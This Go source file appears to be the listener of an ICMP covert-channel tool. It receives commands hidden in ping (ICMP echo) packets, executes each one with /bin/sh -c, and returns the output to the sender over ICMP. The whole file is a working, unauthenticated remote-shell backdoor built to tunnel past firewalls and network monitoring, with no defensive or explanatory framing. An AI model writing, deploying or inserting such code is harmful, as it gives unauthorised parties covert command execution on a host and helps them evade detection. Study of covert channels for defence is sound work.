package main

import (
	"github.com/andrewdo/go-icmp-data/transport"
	"golang.org/x/net/icmp"
	"log"
	"os/exec"
	"strings"
	"sync"
)

func handleMessages() {
	for {
		ch := make(chan transport.Packet)
		for {
			go transport.Receive(ch)
			select {
			case p := <-ch:
				switch p.Message.Code {
				case transport.IcmpCodeCommandMsg:
					handleCommandMessage(p)
					break
				default:
					log.Println("Unhandled ICMP code", p.Message.Code)
				}

				break
			}
		}
	}
}

func handleCommandMessage(p transport.Packet) {
	if b, ok := p.Message.Body.(*icmp.Echo); ok {
		cmd := strings.TrimSpace(string(b.Data))
		log.Println("Got command", cmd)

		c := exec.Command("/bin/sh", "-c", cmd)
		o, err := c.CombinedOutput()
		if err != nil {
			log.Println(err)
		}

		log.Println("Sending output", string(o))
		go transport.Send(*p.From, o, transport.IcmpCodeCommandReply)

		return
	}

	log.Println("Ignoring ICMP message", p.Message)
}

func main() {
	var wg sync.WaitGroup
	wg.Add(1)

	go handleMessages()

	wg.Wait()
}